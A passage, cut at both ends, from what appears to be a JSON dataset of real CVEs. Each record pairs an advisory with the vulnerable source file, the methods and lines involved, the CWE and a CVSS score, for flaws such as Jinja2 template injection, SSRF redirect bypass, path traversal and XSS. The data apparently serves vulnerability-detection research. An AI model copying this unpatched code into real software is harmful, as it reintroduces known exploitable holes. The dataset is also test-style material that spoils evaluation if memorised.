pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 93,
          "content": "        try:"
        },
        {
          "line_no": 99,
          "content": "        except ValueError:"
        },
        {
          "line_no": 100,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 101,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 424,
    "cve": "CVE-2024-28114",
    "description": "Peering Manager is a BGP session management tool. There is a Server Side Template Injection vulnerability that leads to Remote Code Execution in Peering Manager <=1.8.2. As a result arbitrary commands can be executed on the operating system that is running Peering Manager. This issue has been addressed in version 1.8.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "peering_manager/jinja2/__init__.py",
          "content": "from .extensions import *\nfrom .filters import *\nfrom .loaders import *\n\n\ndef render_jinja2(template, context, trim=False, lstrip=False):\n    \"\"\"\n    Render the template using Jinja2.\n    \"\"\"\n    import traceback\n\n    from django.conf import settings\n    from jinja2 import Environment, TemplateSyntaxError\n\n    environment = Environment(\n        loader=PeeringManagerLoader(), trim_blocks=trim, lstrip_blocks=lstrip\n    )\n    environment.add_extension(IncludeTemplateExtension)\n    for extension in settings.JINJA2_TEMPLATE_EXTENSIONS:\n        environment.add_extension(extension)\n\n    # Add custom filters to our environment\n    environment.filters.update(FILTER_DICT)\n\n    # Try rendering the template, return a message about syntax issues if there\n    # are any\n    try:\n        jinja2_template = environment.from_string(template)\n        return jinja2_template.render(**context)\n    except TemplateSyntaxError as e:\n        return f\"Syntax error in template at line {e.lineno}: {e.message}\"\n    except Exception:\n        return traceback.format_exc()\n"
        }
      ],
      "method_level": [
        "def render_jinja2(template, context, trim=False, lstrip=False):\n    \"\"\"\n    Render the template using Jinja2.\n    \"\"\"\n    import traceback\n\n    from django.conf import settings\n    from jinja2 import Environment, TemplateSyntaxError\n\n    environment = Environment(\n        loader=PeeringManagerLoader(), trim_blocks=trim, lstrip_blocks=lstrip\n    )\n    environment.add_extension(IncludeTemplateExtension)\n    for extension in settings.JINJA2_TEMPLATE_EXTENSIONS:\n        environment.add_extension(extension)\n\n    # Add custom filters to our environment\n    environment.filters.update(FILTER_DICT)\n\n    # Try rendering the template, return a message about syntax issues if there\n    # are any\n    try:\n        jinja2_template = environment.from_string(template)\n        return jinja2_template.render(**context)\n    except TemplateSyntaxError as e:\n        return f\"Syntax error in template at line {e.lineno}: {e.message}\"\n    except Exception:\n        return traceback.format_exc()"
      ],
      "hunk_level": [
        {
          "line_no": 13,
          "content": "    from jinja2 import Environment, TemplateSyntaxError"
        },
        {
          "line_no": 15,
          "content": "    environment = Environment("
        }
      ]
    },
    "cwe": [
      "CWE-74"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 1214,
    "cve": "CVE-2024-43795",
    "description": "OpenC3 COSMOS provides the functionality needed to send commands to and receive data from one or more embedded systems. The login functionality contains a reflected cross-site scripting (XSS) vulnerability. This vulnerability is fixed in 5.19.0. Note: This CVE only affects Open Source Edition, and not OpenC3 COSMOS Enterprise Edition.",
    "vulnerability": {
      "file_level": [
        {
          "name": "openc3-cosmos-init/plugins/openc3-tool-base/public/js/auth.js",
          "content": "/*\n# Copyright 2022 Ball Aerospace & Technologies Corp.\n# All Rights Reserved.\n#\n# This program is free software; you can modify and/or redistribute it\n# under the terms of the GNU Affero General Public License\n# as published by the Free Software Foundation; version 3 with\n# attribution addendums as found in the LICENSE.txt\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Affero General Public License for more details.\n\n# Modified by OpenC3, Inc.\n# All changes Copyright 2024, OpenC3, Inc.\n# All Rights Reserved\n*/\n\nconst emptyPromise = function (resolution = null) {\n  return new Promise((resolve) => {\n    resolve(resolution)\n  })\n}\nclass Auth {\n  updateToken(value, from_401 = false) {\n    if (!localStorage.openc3Token || from_401) {\n      this.clearTokens()\n      this.login(location.href)\n    }\n    return emptyPromise()\n  }\n  setTokens() {}\n  clearTokens() {\n    delete localStorage.openc3Token\n  }\n  login(redirect) {\n    // redirect to login if we're not already there\n    if (!/^\\/login/.test(location.pathname))\n      location = `/login?redirect=${encodeURI(redirect)}`\n  }\n  logout() {\n    this.clearTokens()\n    location.reload()\n  }\n  user() {\n    return { name: 'Anonymous' }\n  }\n  userroles() {\n    return ['admin']\n  }\n  getInitOptions() {}\n  init() {\n    return emptyPromise(true)\n  }\n}\nlet OpenC3Auth = new Auth()\n\nObject.defineProperty(OpenC3Auth, 'defaultMinValidity', {\n  value: 30,\n  writable: false,\n  enumerable: true,\n  configurable: false,\n})\n"
        }
      ],
      "method_level": [
        "login(redirect) {\n    // redirect to login if we're not already there\n    if (!/^\\/login/.test(location.pathname))\n      location = `/login?redirect=${encodeURI(redirect)}`\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "      location = `/login?redirect=${encodeURI(redirect)}`"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.1,
    "cvss_version": 4.0
  },
  {
    "id": 149,
    "cve": "CVE-2024-23641",
    "description": "SvelteKit is a web development kit. In SvelteKit 2, sending a GET request with a body eg `{}` to a built and previewed/hosted sveltekit app throws `Request with GET/HEAD method cannot have body.` and crashes the preview/hosting. After this happens, one must manually restart the app. `TRACE` requests will also cause the app to crash. Prerendered pages and SvelteKit 1 apps are not affected. `@sveltejs/adapter-node` versions 2.1.2, 3.0.3, and 4.0.1 and `@sveltejs/kit` version 2.4.3 contain a patch for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/kit/src/exports/node/index.js",
          "content": "import { createReadStream } from 'node:fs';\nimport { Readable } from 'node:stream';\nimport * as set_cookie_parser from 'set-cookie-parser';\nimport { SvelteKitError } from '../../runtime/control.js';\n\n/**\n * @param {import('http').IncomingMessage} req\n * @param {number} [body_size_limit]\n */\nfunction get_raw_body(req, body_size_limit) {\n\tconst h = req.headers;\n\n\tif (!h['content-type']) {\n\t\treturn null;\n\t}\n\n\tconst content_length = Number(h['content-length']);\n\n\t// check if no request body\n\tif (\n\t\t(req.httpVersionMajor === 1 && isNaN(content_length) && h['transfer-encoding'] == null) ||\n\t\tcontent_length === 0\n\t) {\n\t\treturn null;\n\t}\n\n\tif (req.destroyed) {\n\t\tconst readable = new ReadableStream();\n\t\treadable.cancel();\n\t\treturn readable;\n\t}\n\n\tlet size = 0;\n\tlet cancelled = false;\n\n\treturn new ReadableStream({\n\t\tstart(controller) {\n\t\t\tif (body_size_limit !== undefined && content_length > body_size_limit) {\n\t\t\t\tlet message = `Content-length of ${content_length} exceeds limit of ${body_size_limit} bytes.`;\n\n\t\t\t\tif (body_size_limit === 0) {\n\t\t\t\t\t// https://github.com/sveltejs/kit/pull/11589\n\t\t\t\t\t// TODO this exists to aid migration — remove in a future version\n\t\t\t\t\tmessage += ' To disable body size limits, specify Infinity rather than 0.';\n\t\t\t\t}\n\n\t\t\t\tconst error = new SvelteKitError(413, 'Payload Too Large', message);\n\n\t\t\t\tcontroller.error(error);\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\treq.on('error', (error) => {\n\t\t\t\tcancelled = true;\n\t\t\t\tcontroller.error(error);\n\t\t\t});\n\n\t\t\treq.on('end', () => {\n\t\t\t\tif (cancelled) return;\n\t\t\t\tcontroller.close();\n\t\t\t});\n\n\t\t\treq.on('data', (chunk) => {\n\t\t\t\tif (cancelled) return;\n\n\t\t\t\tsize += chunk.length;\n\t\t\t\tif (size > content_length) {\n\t\t\t\t\tcancelled = true;\n\n\t\t\t\t\tconst constraint = content_length ? 'content-length' : 'BODY_SIZE_LIMIT';\n\t\t\t\t\tconst message = `request body size exceeded ${constraint} of ${content_length}`;\n\n\t\t\t\t\tconst error = new SvelteKitError(413, 'Payload Too Large', message);\n\t\t\t\t\tcontroller.error(error);\n\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tcontroller.enqueue(chunk);\n\n\t\t\t\tif (controller.desiredSize === null || controller.desiredSize <= 0) {\n\t\t\t\t\treq.pause();\n\t\t\t\t}\n\t\t\t});\n\t\t},\n\n\t\tpull() {\n\t\t\treq.resume();\n\t\t},\n\n\t\tcancel(reason) {\n\t\t\tcancelled = true;\n\t\t\treq.destroy(reason);\n\t\t}\n\t});\n}\n\n/**\n * @param {{\n *   request: import('http').IncomingMessage;\n *   base: string;\n *   bodySizeLimit?: number;\n * }} options\n * @returns {Promise<Request>}\n */\nexport async function getRequest({ request, base, bodySizeLimit }) {\n\treturn new Request(base + request.url, {\n\t\t// @ts-expect-error\n\t\tduplex: 'half',\n\t\tmethod: request.method,\n\t\theaders: /** @type {Record<string, string>} */ (request.headers),\n\t\tbody: get_raw_body(request, bodySizeLimit)\n\t});\n}\n\n/**\n * @param {import('http').ServerResponse} res\n * @param {Response} response\n * @returns {Promise<void>}\n */\nexport async function setResponse(res, response) {\n\tfor (const [key, value] of response.headers) {\n\t\ttry {\n\t\t\tres.setHeader(\n\t\t\t\tkey,\n\t\t\t\tkey === 'set-cookie'\n\t\t\t\t\t? set_cookie_parser.splitCookiesString(\n\t\t\t\t\t\t\t// This is absurd but necessary, TODO: investigate why\n\t\t\t\t\t\t\t/** @type {string}*/ (response.headers.get(key))\n\t\t\t\t\t\t)\n\t\t\t\t\t: value\n\t\t\t);\n\t\t} catch (error) {\n\t\t\tres.getHeaderNames().forEach((name) => res.removeHeader(name));\n\t\t\tres.writeHead(500).end(String(error));\n\t\t\treturn;\n\t\t}\n\t}\n\n\tres.writeHead(response.status);\n\n\tif (!response.body) {\n\t\tres.end();\n\t\treturn;\n\t}\n\n\tif (response.body.locked) {\n\t\tres.end(\n\t\t\t'Fatal error: Response body is locked. ' +\n\t\t\t\t\"This can happen when the response was already read (for example through 'response.json()' or 'response.text()').\"\n\t\t);\n\t\treturn;\n\t}\n\n\tconst reader = response.body.getReader();\n\n\tif (res.destroyed) {\n\t\treader.cancel();\n\t\treturn;\n\t}\n\n\tconst cancel = (/** @type {Error|undefined} */ error) => {\n\t\tres.off('close', cancel);\n\t\tres.off('error', cancel);\n\n\t\t// If the reader has already been interrupted with an error earlier,\n\t\t// then it will appear here, it is useless, but it needs to be catch.\n\t\treader.cancel(error).catch(() => {});\n\t\tif (error) res.destroy(error);\n\t};\n\n\tres.on('close', cancel);\n\tres.on('error', cancel);\n\n\tnext();\n\tasync function next() {\n\t\ttry {\n\t\t\tfor (;;) {\n\t\t\t\tconst { done, value } = await reader.read();\n\n\t\t\t\tif (done) break;\n\n\t\t\t\tif (!res.write(value)) {\n\t\t\t\t\tres.once('drain', next);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\tres.end();\n\t\t} catch (error) {\n\t\t\tcancel(error instanceof Error ? error : new Error(String(error)));\n\t\t}\n\t}\n}\n\n/**\n * Converts a file on disk to a readable stream\n * @param {string} file\n * @returns {ReadableStream}\n * @since 2.4.0\n */\nexport function createReadableStream(file) {\n\treturn /** @type {ReadableStream} */ (Readable.toWeb(createReadStream(file)));\n}\n"
        }
      ],
      "method_level": [
        "async function getRequest({ request, base, bodySizeLimit }) {\n\treturn new Request(base + request.url, {\n\t\t// @ts-expect-error\n\t\tduplex: 'half',\n\t\tmethod: request.method,\n\t\theaders: /** @type {Record<string, string>} */ (request.headers),\n\t\tbody: get_raw_body(request, bodySizeLimit)\n\t});\n}"
      ],
      "hunk_level": [
        {
          "line_no": 112,
          "content": "\t\tbody: get_raw_body(request, bodySizeLimit)"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 1190,
    "cve": "CVE-2024-47066",
    "description": "Lobe Chat is an open-source artificial intelligence chat framework. Prior to version 1.19.13, server-side request forgery protection implemented in `src/app/api/proxy/route.ts` does not consider redirect and could be bypassed when attacker provides an external malicious URL which redirects to internal resources like a private network or loopback address. Version 1.19.13 contains an improved fix for the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/app/api/proxy/route.ts",
          "content": "import { isPrivate } from 'ip';\nimport { NextResponse } from 'next/server';\nimport dns from 'node:dns';\nimport { promisify } from 'node:util';\n\nconst lookupAsync = promisify(dns.lookup);\n\nexport const runtime = 'nodejs';\n\n/**\n * just for a proxy\n */\nexport const POST = async (req: Request) => {\n  const url = new URL(await req.text());\n  let address;\n\n  try {\n    const lookupResult = await lookupAsync(url.hostname);\n    address = lookupResult.address;\n  } catch (err) {\n    console.error(`${url.hostname} DNS parser error:`, err);\n\n    return NextResponse.json({ error: 'DNS parser error' }, { status: 504 });\n  }\n\n  const isInternalHost = isPrivate(address);\n\n  if (isInternalHost)\n    return NextResponse.json({ error: 'Not support internal host proxy' }, { status: 400 });\n\n  const res = await fetch(url.toString());\n\n  return new Response(res.body, { headers: res.headers });\n};\n"
        }
      ],
      "method_level": [
        "POST"
      ],
      "hunk_level": [
        {
          "line_no": 13,
          "content": "export const POST = async (req: Request) => {"
        },
        {
          "line_no": 14,
          "content": "  const url = new URL(await req.text());"
        },
        {
          "line_no": 15,
          "content": "  let address;"
        },
        {
          "line_no": 17,
          "content": "  try {"
        },
        {
          "line_no": 18,
          "content": "    const lookupResult = await lookupAsync(url.hostname);"
        },
        {
          "line_no": 19,
          "content": "    address = lookupResult.address;"
        },
        {
          "line_no": 20,
          "content": "  } catch (err) {"
        },
        {
          "line_no": 21,
          "content": "    console.error(`${url.hostname} DNS parser error:`, err);"
        },
        {
          "line_no": 23,
          "content": "    return NextResponse.json({ error: 'DNS parser error' }, { status: 504 });"
        },
        {
          "line_no": 24,
          "content": "  }"
        },
        {
          "line_no": 26,
          "content": "  const isInternalHost = isPrivate(address);"
        },
        {
          "line_no": 28,
          "content": "  if (isInternalHost)"
        },
        {
          "line_no": 29,
          "content": "    return NextResponse.json({ error: 'Not support internal host proxy' }, { status: 400 });"
        },
        {
          "line_no": 31,
          "content": "  const res = await fetch(url.toString());"
        },
        {
          "line_no": 33,
          "content": "  return new Response(res.body, { headers: res.headers });"
        },
        {
          "line_no": 34,
          "content": "};"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 587,
    "cve": "CVE-2024-3569",
    "description": "A Denial of Service (DoS) vulnerability exists in the mintplex-labs/anything-llm repository when the application is running in 'just me' mode with a password. An attacker can exploit this vulnerability by making a request to the endpoint using the [validatedRequest] middleware with a specially crafted 'Authorization:' header. This vulnerability leads to uncontrolled resource consumption, causing a DoS condition.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/middleware/validatedRequest.js",
          "content": "const { SystemSettings } = require(\"../../models/systemSettings\");\nconst { User } = require(\"../../models/user\");\nconst { decodeJWT } = require(\"../http\");\n\nasync function validatedRequest(request, response, next) {\n  const multiUserMode = await SystemSettings.isMultiUserMode();\n  response.locals.multiUserMode = multiUserMode;\n  if (multiUserMode)\n    return await validateMultiUserRequest(request, response, next);\n\n  // When in development passthrough auth token for ease of development.\n  // Or if the user simply did not set an Auth token or JWT Secret\n  if (\n    process.env.NODE_ENV === \"development\" ||\n    !process.env.AUTH_TOKEN ||\n    !process.env.JWT_SECRET\n  ) {\n    next();\n    return;\n  }\n\n  if (!process.env.AUTH_TOKEN) {\n    response.status(401).json({\n      error: \"You need to set an AUTH_TOKEN environment variable.\",\n    });\n    return;\n  }\n\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const bcrypt = require(\"bcrypt\");\n  const { p } = decodeJWT(token);\n  if (!bcrypt.compareSync(p, bcrypt.hashSync(process.env.AUTH_TOKEN, 10))) {\n    response.status(401).json({\n      error: \"Invalid auth token found.\",\n    });\n    return;\n  }\n\n  next();\n}\n\nasync function validateMultiUserRequest(request, response, next) {\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const valid = decodeJWT(token);\n  if (!valid || !valid.id) {\n    response.status(401).json({\n      error: \"Invalid auth token.\",\n    });\n    return;\n  }\n\n  const user = await User.get({ id: valid.id });\n  if (!user) {\n    response.status(401).json({\n      error: \"Invalid auth for user.\",\n    });\n    return;\n  }\n\n  if (user.suspended) {\n    response.status(401).json({\n      error: \"User is suspended from system\",\n    });\n    return;\n  }\n\n  response.locals.user = user;\n  next();\n}\n\nmodule.exports = {\n  validatedRequest,\n};\n"
        }
      ],
      "method_level": [
        "async function validatedRequest(request, response, next) {\n  const multiUserMode = await SystemSettings.isMultiUserMode();\n  response.locals.multiUserMode = multiUserMode;\n  if (multiUserMode)\n    return await validateMultiUserRequest(request, response, next);\n\n  // When in development passthrough auth token for ease of development.\n  // Or if the user simply did not set an Auth token or JWT Secret\n  if (\n    process.env.NODE_ENV === \"development\" ||\n    !process.env.AUTH_TOKEN ||\n    !process.env.JWT_SECRET\n  ) {\n    next();\n    return;\n  }\n\n  if (!process.env.AUTH_TOKEN) {\n    response.status(401).json({\n      error: \"You need to set an AUTH_TOKEN environment variable.\",\n    });\n    return;\n  }\n\n  const auth = request.header(\"Authorization\");\n  const token = auth ? auth.split(\" \")[1] : null;\n\n  if (!token) {\n    response.status(401).json({\n      error: \"No auth token found.\",\n    });\n    return;\n  }\n\n  const bcrypt = require(\"bcrypt\");\n  const { p } = decodeJWT(token);\n  if (!bcrypt.compareSync(p, bcrypt.hashSync(process.env.AUTH_TOKEN, 10))) {\n    response.status(401).json({\n      error: \"Invalid auth token found.\",\n    });\n    return;\n  }\n\n  next();\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "      error: \"Invalid auth token found.\","
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 666,
    "cve": "CVE-2024-3571",
    "description": "langchain-ai/langchain is vulnerable to path traversal due to improper limitation of a pathname to a restricted directory ('Path Traversal') in its LocalFileStore functionality. An attacker can leverage this vulnerability to read or write files anywhere on the filesystem, potentially leading to information disclosure or remote code execution. The issue lies in the handling of file paths in the mset and mget methods, where user-supplied input is not adequately sanitized, allowing directory traversal sequences to reach unintended directories.",
    "vulnerability": {
      "file_level": [
        {
          "name": "libs/langchain/langchain/storage/file_system.py",
          "content": "import re\nfrom pathlib import Path\nfrom typing import Iterator, List, Optional, Sequence, Tuple, Union\n\nfrom langchain_core.stores import ByteStore\n\nfrom langchain.storage.exceptions import InvalidKeyException\n\n\nclass LocalFileStore(ByteStore):\n    \"\"\"BaseStore interface that works on the local file system.\n\n    Examples:\n        Create a LocalFileStore instance and perform operations on it:\n\n        .. code-block:: python\n\n            from langchain.storage import LocalFileStore\n\n            # Instantiate the LocalFileStore with the root path\n            file_store = LocalFileStore(\"/path/to/root\")\n\n            # Set values for keys\n            file_store.mset([(\"key1\", b\"value1\"), (\"key2\", b\"value2\")])\n\n            # Get values for keys\n            values = file_store.mget([\"key1\", \"key2\"])  # Returns [b\"value1\", b\"value2\"]\n\n            # Delete keys\n            file_store.mdelete([\"key1\"])\n\n            # Iterate over keys\n            for key in file_store.yield_keys():\n                print(key)\n\n    \"\"\"\n\n    def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path)\n\n    def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        return self.root_path / key\n\n    def mget(self, keys: Sequence[str]) -> List[Optional[bytes]]:\n        \"\"\"Get the values associated with the given keys.\n\n        Args:\n            keys: A sequence of keys.\n\n        Returns:\n            A sequence of optional values associated with the keys.\n            If a key is not found, the corresponding value will be None.\n        \"\"\"\n        values: List[Optional[bytes]] = []\n        for key in keys:\n            full_path = self._get_full_path(key)\n            if full_path.exists():\n                value = full_path.read_bytes()\n                values.append(value)\n            else:\n                values.append(None)\n        return values\n\n    def mset(self, key_value_pairs: Sequence[Tuple[str, bytes]]) -> None:\n        \"\"\"Set the values for the given keys.\n\n        Args:\n            key_value_pairs: A sequence of key-value pairs.\n\n        Returns:\n            None\n        \"\"\"\n        for key, value in key_value_pairs:\n            full_path = self._get_full_path(key)\n            full_path.parent.mkdir(parents=True, exist_ok=True)\n            full_path.write_bytes(value)\n\n    def mdelete(self, keys: Sequence[str]) -> None:\n        \"\"\"Delete the given keys and their associated values.\n\n        Args:\n            keys (Sequence[str]): A sequence of keys to delete.\n\n        Returns:\n            None\n        \"\"\"\n        for key in keys:\n            full_path = self._get_full_path(key)\n            if full_path.exists():\n                full_path.unlink()\n\n    def yield_keys(self, prefix: Optional[str] = None) -> Iterator[str]:\n        \"\"\"Get an iterator over keys that match the given prefix.\n\n        Args:\n            prefix (Optional[str]): The prefix to match.\n\n        Returns:\n            Iterator[str]: An iterator over keys that match the given prefix.\n        \"\"\"\n        prefix_path = self._get_full_path(prefix) if prefix else self.root_path\n        for file in prefix_path.rglob(\"*\"):\n            if file.is_file():\n                relative_path = file.relative_to(self.root_path)\n                yield str(relative_path)\n"
        }
      ],
      "method_level": [
        "def __init__(self, root_path: Union[str, Path]) -> None:\n        \"\"\"Implement the BaseStore interface for the local file system.\n\n        Args:\n            root_path (Union[str, Path]): The root path of the file store. All keys are\n                interpreted as paths relative to this root.\n        \"\"\"\n        self.root_path = Path(root_path)",
        "def _get_full_path(self, key: str) -> Path:\n        \"\"\"Get the full path for a given key relative to the root path.\n\n        Args:\n            key (str): The key relative to the root path.\n\n        Returns:\n            Path: The full path for the given key.\n        \"\"\"\n        if not re.match(r\"^[a-zA-Z0-9_.\\-/]+$\", key):\n            raise InvalidKeyException(f\"Invalid characters in key: {key}\")\n        return self.root_path / key"
      ],
      "hunk_level": [
        {
          "line_no": 45,
          "content": "        self.root_path = Path(root_path)"
        },
        {
          "line_no": 58,
          "content": "        return self.root_path / key"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_version": 3.1
  },
  {
    "id": 215,
    "cve": "CVE-2025-54134",
    "description": "HAX CMS NodeJs allows users to manage their microsite universe with a NodeJs backend. In versions 11.0.8 and below, the HAX CMS NodeJS application crashes when an authenticated attacker provides an API request lacking required URL parameters. This vulnerability affects the listFiles and saveFiles endpoints. This vulnerability exists because the application does not properly handle exceptions which occur as a result of changes to user-modifiable URL parameters. This is fixed in version 11.0.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/routes/listFiles.js",
          "content": "const { HAXCMS } = require('../lib/HAXCMS.js');\nconst fs = require('fs');\nconst path = require('path');\nconst mime = require('mime');\n/**\n   * @OA\\Post(\n   *    path=\"/listFiles\",\n   *    tags={\"hax\",\"authenticated\",\"file\"},\n   *    @OA\\Parameter(\n   *         name=\"jwt\",\n   *         description=\"JSON Web token, obtain by using  /login\",\n   *         in=\"query\",\n   *         required=true,\n   *         @OA\\Schema(type=\"string\")\n   *    ),\n   *    @OA\\Response(\n   *        response=\"200\",\n   *        description=\"Load existing files for presentation in HAX find area\"\n   *   )\n   * )\n   */\n  async function listFiles(req, res) {\n    let files = [];\n    let site = await HAXCMS.loadSite(req.query['siteName']);\n    if (site && site.siteDirectory) {\n      let search = (typeof req.query['filename'] !== 'undefined') ? req.query['filename'] : '';\n      // build files directory path\n      let siteFilePath = path.join(site.siteDirectory, 'files');\n      let handle;\n      if (handle = fs.readdirSync(siteFilePath)) {\n        handle.forEach(file => {\n          if (\n              file != \".\" &&\n              file != \"..\" &&\n              file != '.gitkeep' &&\n              file != '.DS_Store'\n          ) {\n            // ensure this is a file\n            if (\n              fs.lstatSync(siteFilePath + '/' + file).isFile()\n            ) {\n              // ensure this is a file and if we are searching for results then return only exact ones\n              if (search == \"\" || file.indexOf(search) !== -1) {\n                let fullUrl = '/files/' + file;\n                // multiple sites then append the base url to site management area\n                if (HAXCMS.operatingContext == 'multisite') {\n                  fullUrl = HAXCMS.basePath +\n                  HAXCMS.sitesDirectory + '/' +\n                  site.manifest.metadata.site.name + '/files/' + file\n                }\n                files.push({\n                  'path' : 'files/' + file,\n                  'fullUrl' : fullUrl,\n                  'url' : 'files/' + file,\n                  'mimetype' : mime.getType(siteFilePath + '/' + file),\n                  'name' : file\n                });\n              }\n            } else {\n                // @todo maybe step into directories?\n            }\n          }\n        });\n      }\n    }\n    res.send(files);\n  }\n  module.exports = listFiles;"
        }
      ],
      "method_level": [
        "async function listFiles(req, res) {\n    let files = [];\n    let site = await HAXCMS.loadSite(req.query['siteName']);\n    if (site && site.siteDirectory) {\n      let search = (typeof req.query['filename'] !== 'undefined') ? req.query['filename'] : '';\n      // build files directory path\n      let siteFilePath = path.join(site.siteDirectory, 'files');\n      let handle;\n      if (handle = fs.readdirSync(siteFilePath)) {\n        handle.forEach(file => {\n          if (\n              file != \".\" &&\n              file != \"..\" &&\n              file != '.gitkeep' &&\n              file != '.DS_Store'\n          ) {\n            // ensure this is a file\n            if (\n              fs.lstatSync(siteFilePath + '/' + file).isFile()\n            ) {\n              // ensure this is a file and if we are searching for results then return only exact ones\n              if (search == \"\" || file.indexOf(search) !== -1) {\n                let fullUrl = '/files/' + file;\n                // multiple sites then append the base url to site management area\n                if (HAXCMS.operatingContext == 'multisite') {\n                  fullUrl = HAXCMS.basePath +\n                  HAXCMS.sitesDirectory + '/' +\n                  site.manifest.metadata.site.name + '/files/' + file\n                }\n                files.push({\n                  'path' : 'files/' + file,\n                  'fullUrl' : fullUrl,\n                  'url' : 'files/' + file,\n                  'mimetype' : mime.getType(siteFilePath + '/' + file),\n                  'name' : file\n                });\n              }\n            } else {\n                // @todo maybe step into directories?\n            }\n          }\n        });\n      }\n    }\n    res.send(files);\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    let site = await HAXCMS.loadSite(req.query['siteName']);"
        },
        {
          "line_no": 25,
          "content": "    if (site && site.siteDirectory) {"
        },
        {
          "line_no": 26,
          "content": "      let search = (typeof req.query['filename'] !== 'undefined') ? req.query['filename'] : '';"
        },
        {
          "line_no": 27,
          "content": "      // build files directory path"
        },
        {
          "line_no": 28,
          "content": "      let siteFilePath = path.join(site.siteDirectory, 'files');"
        },
        {
          "line_no": 29,
          "content": "      let handle;"
        },
        {
          "line_no": 30,
          "content": "      if (handle = fs.readdirSync(siteFilePath)) {"
        },
        {
          "line_no": 31,
          "content": "        handle.forEach(file => {"
        },
        {
          "line_no": 32,
          "content": "          if ("
        },
        {
          "line_no": 33,
          "content": "              file != \".\" &&"
        },
        {
          "line_no": 34,
          "content": "              file != \"..\" &&"
        },
        {
          "line_no": 35,
          "content": "              file != '.gitkeep' &&"
        },
        {
          "line_no": 36,
          "content": "              file != '.DS_Store'"
        },
        {
          "line_no": 37,
          "content": "          ) {"
        },
        {
          "line_no": 38,
          "content": "            // ensure this is a file"
        },
        {
          "line_no": 40,
          "content": "              fs.lstatSync(siteFilePath + '/' + file).isFile()"
        },
        {
          "line_no": 42,
          "content": "              // ensure this is a file and if we are searching for results then return only exact ones"
        },
        {
          "line_no": 43,
          "content": "              if (search == \"\" || file.indexOf(search) !== -1) {"
